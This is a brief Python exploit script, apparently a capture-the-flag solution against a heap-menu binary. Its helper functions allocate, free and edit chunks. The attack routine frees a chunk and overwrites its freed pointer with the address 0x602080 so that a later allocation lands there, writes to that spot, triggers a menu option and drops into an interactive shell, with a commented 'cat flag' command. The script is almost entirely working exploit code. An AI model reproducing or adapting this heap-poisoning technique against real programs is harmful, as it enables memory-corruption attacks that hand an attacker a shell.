from parse_args_and_some_func import *

sh = None

def add_heap(size:int):
    global sh
    sh.sendlineafter("choice>\n", "1")
    sh.sendlineafter("size>\n", str(size))

def del_heap(idx:int):
    global sh
    sh.sendlineafter("choice>\n", "2")
    sh.sendlineafter("index>\n", str(idx))

def edit_heap(idx:int, content):
    global sh
    sh.sendlineafter("choice>\n", "3")
    sh.sendlineafter("index>\n", str(idx))
    sh.send(content)

def attack():
    global sh
    add_heap(0x40) # 0
    del_heap(0)
    edit_heap(0, p64(0x602080))
    # STOP()
    add_heap(0x40) # 1
    add_heap(0x40) # 2
    edit_heap(2, p64(0))

    sh.sendlineafter("choice>\n", "4")
    # sh.sendline('cat flag')
    sh.interactive()

if __name__ == '__main__':
    global sh
    sh = all_parsed_args['io']
    attack()
    